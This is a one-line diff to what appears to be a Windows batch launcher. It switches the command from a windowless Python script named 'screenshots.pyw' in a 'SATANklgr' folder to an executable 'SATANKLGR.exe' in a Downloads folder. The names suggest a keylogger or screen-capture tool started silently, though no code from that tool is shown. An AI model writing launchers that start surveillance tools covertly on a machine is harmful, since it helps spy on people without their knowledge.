@@ -1,1 +1,1 @@
-start "" d:\Python\SATANklgr\screenshots.pyw
+start "" C:\Users\user\Downloads\SATANKLGR.exe
